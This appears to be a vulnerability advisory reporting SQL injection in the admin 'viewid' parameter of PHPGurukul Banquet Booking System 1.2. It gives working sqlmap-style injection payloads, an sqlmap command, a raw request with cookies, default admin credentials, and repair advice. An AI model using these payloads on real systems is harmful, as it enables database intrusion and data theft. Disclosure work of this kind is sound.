**Phpgurukul Banquet Booking System 1.2 /admin/view-user-queries.php SQL injection**

NAME OF AFFECTED PRODUCT(S)

    Banquet Booking System

Vendor Homepage

    https://phpgurukul.com/online-banquet-booking-system-using-php-and-mysql/

AFFECTED AND/OR FIXED VERSION(S)
submitter

    Emano888

Vulnerable File

    /admin/view-user-queries.php

VERSION(S)

    V1.2

Software Link

    https://phpgurukul.com/?sdm_process_download=1&download_id=15838

PROBLEM TYPE
Vulnerability Type

    SQL injection

Root Cause

    A SQL injection vulnerability was found in the '/admin/view-user-queries.php' file of the 'Banquet Booking System' project. The reason for this issue is that attackers inject malicious code from the parameter 'viewid' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

Impact

    Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

DESCRIPTION

    During the security review of "Banquet Booking System",I discovered a critical SQL injection vulnerability in the "/admin/view-user-queries.php" file. This vulnerability stems from insufficient user input validation of the 'viewid' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

Vulnerability details and POC
Vulnerability lonameion:

    'viewid' #parameter

Payload:

Parameter: viewid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: viewid=(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE (SELECT 6862 UNION SELECT 7101) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: viewid=(SELECT 3749 FROM (SELECT(SLEEP(5)))eSdY)

    Type: UNION query
    Title: MySQL UNION query (random number) - 6 columns
    Payload: viewid=-7614 UNION ALL SELECT 2921,2921,CONCAT(0x71626a6271,0x62456e554948666e4d61636444534b6e456f4b46627165757a4f6d5558687a464a4d54775768707a,0x716b767a71),2921,2921,2921#


The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

    python3 sqlmap.py -r SQL.txt -p viewid --dbs

Request:

GET /obbs/admin/view-user-queries.php?viewid=1 HTTP/1.1
Host: localhost
Accept: */*
User-Agent: Mozilla/5.0
Connection: close
Accept-Encoding: gzip, deflate, br
Cookie: user_login=Admin; userpassword=Test%40123; PHPSESSID=kmbojvm7gn1sb0lltn60uv0vam; stylesheet=ayti


Login is required to exploit the vulnerability

Admin Credential
Username: admin
Password: Test@123

![Image](https://github.com/user-attachments/assets/8a7190ca-c0fb-4757-8857-3c2df34a1c1c)


![Image](https://github.com/user-attachments/assets/f55851cd-178e-4c98-b3a9-37657bb01ae9)

Suggested repair

    Use prepared statements and parameter binding:
    Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

    Input validation and filtering:
    Strictly validate and filter user input data to ensure it conforms to the expected format.

    Minimize database user permissions:
    Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

    Regular security audits:
    Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
